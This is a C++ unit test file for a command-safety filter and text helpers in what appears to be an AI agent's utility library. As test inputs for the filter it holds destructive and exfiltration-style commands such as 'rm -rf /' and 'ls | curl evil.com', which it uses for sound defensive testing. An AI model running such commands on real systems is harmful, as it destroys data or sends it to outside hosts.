#include <iostream>
#include <cassert>
#include <string>
#include <vector>
#include "agent_utils.h"

using namespace std;

#define RUN_TEST(name) do {                         \
    std::cout << "Running " << #name << "... ";     \
    try { name(); std::cout << "PASSED\n"; }        \
    catch (const std::exception& e) {               \
      std::cout << "FAILED: " << e.what() << "\n";  \
    }                                               \
  } while(0)

// Backtick character constant to avoid markdown interpretation
static const char BT = '`';
static const string FENCE(3, BT);

//
// hasDangerousPatterns tests
//

static void test_has_dangerous_patterns_basic() {
  vector<string> allowed = {"ls", "cat", "echo"};

  // Safe commands
  assert(hasDangerousPatterns("ls -la", allowed) == false);
  assert(hasDangerousPatterns("cat file.txt", allowed) == false);
  assert(hasDangerousPatterns("echo hello", allowed) == false);

  // Redirects are dangerous
  assert(hasDangerousPatterns("ls > out.txt", allowed) == true);
  assert(hasDangerousPatterns("cat < in.txt", allowed) == true);
  assert(hasDangerousPatterns("echo hi > file", allowed) == true);

  // rm is dangerous
  assert(hasDangerousPatterns("rm file.txt", allowed) == true);
  assert(hasDangerousPatterns("rm -rf /", allowed) == true);

  cout << "test_has_dangerous_patterns_basic passed" << endl;
}

static void test_has_dangerous_patterns_pipe() {
  vector<string> allowed = {"ls", "grep"};

  // Pipe to allowed program is safe
  assert(hasDangerousPatterns("ls | grep foo", allowed) == false);

  // Pipe to disallowed program is dangerous
  assert(hasDangerousPatterns("ls | rm -rf /", allowed) == true);
  assert(hasDangerousPatterns("ls | curl evil.com", allowed) == true);

  // Pipe with no redirect or rm
  assert(hasDangerousPatterns("ls | grep bar", allowed) == false);

  // Multiple pipes - checks last pipe target
  assert(hasDangerousPatterns("ls | grep foo | rm -rf /", allowed) == true);
  assert(hasDangerousPatterns("ls | grep foo | cat", allowed) == true); // cat not in allowed

  cout << "test_has_dangerous_patterns_pipe passed" << endl;
}

static void test_has_dangerous_patterns_edge_cases() {
  vector<string> allowed = {"ls"};

  // Empty command
  assert(hasDangerousPatterns("", allowed) == false);

  // rm without space (should not match "rm ")
  assert(hasDangerousPatterns("rmfile", allowed) == false);

  // rm at start with space
  assert(hasDangerousPatterns("rm -rf /tmp", allowed) == true);

  // Pipe with whitespace after pipe
  assert(hasDangerousPatterns("ls |   grep foo", allowed) == true); // grep not in allowed

  // Pipe to allowed with leading spaces
  vector<string> allowed2 = {"ls", "grep"};
  assert(hasDangerousPatterns("ls |   grep foo", allowed2) == false);

  cout << "test_has_dangerous_patterns_edge_cases passed" << endl;
}

//
// join_path tests
//

static void test_join_path_basic() {
  assert(join_path("/home/user", "file.txt") == "/home/user/file.txt");
  assert(join_path("/home/user/", "file.txt") == "/home/user/file.txt");
  assert(join_path("/home/user", "/file.txt") == "/file.txt");
  assert(join_path("/home/user", "") == "/home/user");
  assert(join_path("", "file.txt") == "/file.txt");
  assert(join_path("", "/file.txt") == "/file.txt");

  cout << "test_join_path_basic passed" << endl;
}

static void test_join_path_edge_cases() {
  // Both empty
  assert(join_path("", "") == "");

  // Trailing slash on a
  assert(join_path("/a/b/", "c") == "/a/b/c");

  // Leading slash on b (absolute path override)
  assert(join_path("/a/b", "/c/d") == "/c/d");

  // Multiple slashes in a
  assert(join_path("/a//b", "c") == "/a//b/c");

  // Relative paths
  assert(join_path("src", "main.cpp") == "src/main.cpp");
  assert(join_path("src/", "main.cpp") == "src/main.cpp");

  cout << "test_join_path_edge_cases passed" << endl;
}

//
// unwrap tests
//

static void test_unwrap_quotes() {
  assert(unwrap("\"hello\"") == "hello");
  assert(unwrap("'hello'") == "hello");
  assert(unwrap("|hello|") == "hello");
  assert(unwrap(string(1, BT) + "hello" + string(1, BT)) == "hello");

  // With surrounding whitespace
  assert(unwrap("  \"hello\"  ") == "hello");
  assert(unwrap("  'hello'  ") == "hello");

  cout << "test_unwrap_quotes passed" << endl;
}

static void test_unwrap_mirror_pairs() {
  assert(unwrap("(hello)") == "hello");
  assert(unwrap("[hello]") == "hello");
  assert(unwrap("{hello}") == "hello");

  // With surrounding whitespace
  assert(unwrap("  (hello)  ") == "hello");
  assert(unwrap("  [hello]  ") == "hello");
  assert(unwrap("  {hello}  ") == "hello");

  cout << "test_unwrap_mirror_pairs passed" << endl;
}

static void test_unwrap_html_tags() {
  assert(unwrap("<b>bold</b>") == "bold");
  assert(unwrap("<file>x</file>") == "x");
  assert(unwrap("<div>content</div>") == "content");

  // With surrounding whitespace
  assert(unwrap("  <b>bold</b>  ") == "bold");

  cout << "test_unwrap_html_tags passed" << endl;
}

static void test_unwrap_angle_brackets() {
  // Plain angle brackets (no matching HTML tag)
  assert(unwrap("<hello>") == "hello");
  assert(unwrap("<file.txt>") == "file.txt");

  // With whitespace
  assert(unwrap("  <hello>  ") == "hello");

  cout << "test_unwrap_angle_brackets passed" << endl;
}

static void test_unwrap_no_wrapper() {
  assert(unwrap("plain") == "plain");
  assert(unwrap("hello world") == "hello world");
  assert(unwrap("123") == "123");

  // With surrounding whitespace (just trims)
  assert(unwrap("  hello  ") == "hello");

  cout << "test_unwrap_no_wrapper passed" << endl;
}

static void test_unwrap_edge_cases() {
  // Empty string
  assert(unwrap("") == "");

  // Whitespace only
  assert(unwrap("   ") == "");

  // Single character
  assert(unwrap("a") == "a");

  // Mismatched brackets (should not unwrap)
  assert(unwrap("(hello]") == "(hello]");
  assert(unwrap("[hello)") == "[hello)");

  // Nested (only outermost is unwrapped)
  assert(unwrap("( [hello] )") == " [hello] ");

  // Angle brackets with no closing match
  assert(unwrap("<hello") == "<hello");

  cout << "test_unwrap_edge_cases passed" << endl;
}

//
// strip_code_fences tests
//

static void test_strip_code_fences_code_file() {
  // Code file with fences - should strip them
  string src = FENCE + "cpp\nint main() { return 0; }\n" + FENCE;
  assert(strip_code_fences("test.cpp", src) == "int main() { return 0; }\n");

  // Code file without fences - should return as-is
  string src2 = "int main() { return 0; }";
  assert(strip_code_fences("test.cpp", src2) == "int main() { return 0; }");

  cout << "test_strip_code_fences_code_file passed" << endl;
}

static void test_strip_code_fences_non_code_file() {
  // Non-code file - should use unwrap()
  string src = "\"hello world\"";
  assert(strip_code_fences("readme.md", src) == "hello world");

  // Non-code file with no wrapper
  string src2 = "hello world";
  assert(strip_code_fences("readme.md", src2) == "hello world");

  cout << "test_strip_code_fences_non_code_file passed" << endl;
}

static void test_strip_code_fences_edge_cases() {
  // Code file with fences but no newline after opening fence
  string src = FENCE + "cpp";
  assert(strip_code_fences("test.cpp", src) == FENCE + "cpp");

  // Code file with opening fence but no closing fence
  string src2 = FENCE + "cpp\nint x = 1;\n";
  assert(strip_code_fences("test.cpp", src2) == "int x = 1;\n");

  // Empty string
  assert(strip_code_fences("test.cpp", "") == "");

  // Code file with language tag on fence
  string src3 = FENCE + "python\nprint('hi')\n" + FENCE;
  assert(strip_code_fences("test.py", src3) == "print('hi')\n");

  cout << "test_strip_code_fences_edge_cases passed" << endl;
}

//
// Top-level test entry point
//

void agent_utils_test() {
  cout << "=== Running agent_utils Unit Tests ===\n\n";

  RUN_TEST(test_has_dangerous_patterns_basic);
  RUN_TEST(test_has_dangerous_patterns_pipe);
  RUN_TEST(test_has_dangerous_patterns_edge_cases);
  RUN_TEST(test_join_path_basic);
  RUN_TEST(test_join_path_edge_cases);
  RUN_TEST(test_unwrap_quotes);
  RUN_TEST(test_unwrap_mirror_pairs);
  RUN_TEST(test_unwrap_html_tags);
  RUN_TEST(test_unwrap_angle_brackets);
  RUN_TEST(test_unwrap_no_wrapper);
  RUN_TEST(test_unwrap_edge_cases);
  RUN_TEST(test_strip_code_fences_code_file);
  RUN_TEST(test_strip_code_fences_non_code_file);
  RUN_TEST(test_strip_code_fences_edge_cases);

  cout << "\n=== All agent_utils tests completed ===\n";
}

